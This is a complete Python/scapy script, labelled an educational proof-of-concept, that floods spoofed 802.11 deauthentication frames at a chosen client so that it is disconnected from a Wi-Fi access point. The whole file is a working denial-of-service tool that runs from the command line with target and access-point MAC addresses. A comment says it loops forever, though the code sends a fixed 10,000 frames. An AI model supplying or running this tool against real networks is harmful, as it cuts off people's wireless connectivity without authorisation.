import sys
from scapy.all import *

# WifiJammer - Deauthentication Flooder
# Educational Proof-of-Concept
# Disconnects clients from an Access Point (DoS)

def deauth(target_mac, gateway_mac, iface):
    # 802.11 Frame Construction
    # Type 0 (Mgmt), Subtype 12 (Deauth)
    # Addr1: Destination (Client)
    # Addr2: Source (AP - Spoofed)
    # Addr3: BSSID (AP)
    
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7) # Reason 7: Class 3 frame received from non-associated STA

    print(f"[*] Sending Deauth frames: {gateway_mac} -> {target_mac}")
    
    # Loop forever
    sendp(packet, iface=iface, count=10000, inter=0.1, verbose=1)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python WifiJammer.py <target_mac> <ap_mac> <interface>")
        sys.exit(1)

    t_mac = sys.argv[1]
    g_mac = sys.argv[2]
    iface = sys.argv[3]

    deauth(t_mac, g_mac, iface)
